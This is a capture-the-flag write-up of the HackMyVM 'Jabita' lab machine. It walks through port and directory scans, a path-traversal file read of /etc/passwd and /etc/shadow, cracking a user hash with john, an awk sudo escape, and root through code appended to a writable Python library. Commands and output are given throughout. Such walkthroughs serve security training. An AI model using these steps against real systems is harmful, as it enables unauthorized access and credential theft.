---
layout: post
title: "HackMyVM - Jabita"
date: 2022-09-09 15:47:00 +0100
categories: hmv
tag: ["LFI", "Python"]
---

Creator: [RiJaba1](https://hackmyvm.eu/profile/?user=RiJaba1)
Level: Easy
Release Date: 2022-09-09

## Scan

```bash
$ nmap -sC -sV -oA scans/Jabita -p- 192.168.1.11
Starting Nmap 7.93 ( https://nmap.org ) at 2022-09-09 16:57 WET
Nmap scan report for 192.168.1.11
Host is up (0.00028s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 00b003d392f8a0f95a93207bf80aaada (ECDSA)
|_  256 ddb4261d0ce738c37a2f07bef8743ebc (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.95 seconds
```

## Enumeration 

```
$ gobuster dir -u http://192.168.1.11/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,jpg -o scans/gobuster-medium.log
```

```bash
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.11/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,jpg,html,php
[+] Timeout:                 10s
===============================================================
2022/09/09 16:59:03 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 62]
/building             (Status: 301) [Size: 315] [--> http://192.168.1.11/building/]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
===============================================================
2022/09/09 17:03:03 Finished
===============================================================
```

### Server

```
$ nikto -h http://192.168.1.11/building -C all -output scans/nikto-192.168.1.11.html -Format HTML      
```

```bash
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.1.11
+ Target Hostname:    192.168.1.11
+ Target Port:        80
+ Start Time:         2022-09-09 17:09:46 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.52 (Ubuntu)
+ /building/: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /building/: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: POST, OPTIONS, HEAD, GET .
+ /building/index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php).
+ 26640 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2022-09-09 17:10:44 (GMT0) (58 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## LFI

* http://192.168.1.11/building/index.php?page=../../../../../../../../../../etc/passwd

```
$ curl http://192.168.1.11/building/index.php?page=../../../../../../../../../../etc/passwd
```

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
jack:x:1001:1001::/home/jack:/bin/bash
jaba:x:1002:1002::/home/jaba:/bin/bash
```

```
$ curl http://192.168.1.11/building/index.php?page=/etc/shadow                             
```

```bash
root:$y$j9T$avXO7BCR5/iCNmeaGmMSZ0$gD9m7w9/zzi1iC9XoaomnTHTp0vde7smQL1eYJ1V3u1:19240:0:99999:7:::
jack:$6$xyz$FU1GrBztUeX8krU/94RECrFbyaXNqU8VMUh3YThGCAGhlPqYCQryXBln3q2J2vggsYcTrvuDPTGsPJEpn/7U.0:19236:0:99999:7:::
jaba:$y$j9T$pWlo6WbJDbnYz6qZlM87d.$CGQnSEL8aHLlBY/4Il6jFieCPzj7wk54P8K4j/xhi/1:19240:0:99999:7:::
```

## Cracking User Accounts

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
jo*****a         (jack)     
1g 0:00:00:03 DONE (2022-09-09 17:16) 0.2666g/s 1024p/s 1024c/s 1024C/s energy..dodgers
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

## SSH (jack)

```
$ ssh jack@192.168.1.11
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-47-generic x86_64)
Last login: Mon Sep  5 12:01:58 2022 from 192.163.0.90
jack@jabita:~$ 
```

## Lateral Movement (jack > jaba) - [awk](https://gtfobins.github.io/gtfobins/awk/#sudo)

```
jack@jabita:~$ sudo -l
Matching Defaults entries for jack on jabita:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, listpw=never

User jack may run the following commands on jabita:
    (jaba : jaba) NOPASSWD: /usr/bin/awk
jack@jabita:~$ sudo -u jaba awk 'BEGIN {system("/bin/sh")}'
$ id
uid=1002(jaba) gid=1002(jaba) groups=1002(jaba)
$
```

```
$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
jaba@jabita:/home/jack$ cd
jaba@jabita:~$ 
```

## ROOT

```
jaba@jabita:~$ sudo -l
Matching Defaults entries for jaba on jabita:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, listpw=never

User jaba may run the following commands on jabita:
    (root) NOPASSWD: /usr/bin/python3 /usr/bin/clean.py
jaba@jabita:~$ 

jaba@jabita:~$ cat /usr/bin/clean.py
import wild

wild.first()
```

* Looking for wild library

```
jaba@jabita:~$ find / -iname wild.py 2>/dev/null
/usr/lib/python3.10/wild.py
jaba@jabita:~$ ls -alh /usr/lib/python3.10/wild.py
-rw-r--rw- 1 root root 29 Sep  5  2022 /usr/lib/python3.10/wild.py
jaba@jabita:~$ cat /usr/lib/python3.10/wild.py
def first():
        print("Hello")
```

* Write permission > inject reverse shell

```
jaba@jabita:~$ echo import 'os; os.system("/bin/bash")' >> /usr/lib/python3.10/wild.py
jaba@jabita:~$ cat /usr/lib/python3.10/wild.py
def first():
        print("Hello")
import os; os.system("/bin/bash")
```

```
jaba@jabita:~$ sudo /usr/bin/python3 /usr/bin/clean.py
root@jabita:/home/jaba# id
uid=0(root) gid=0(root) groups=0(root)
```
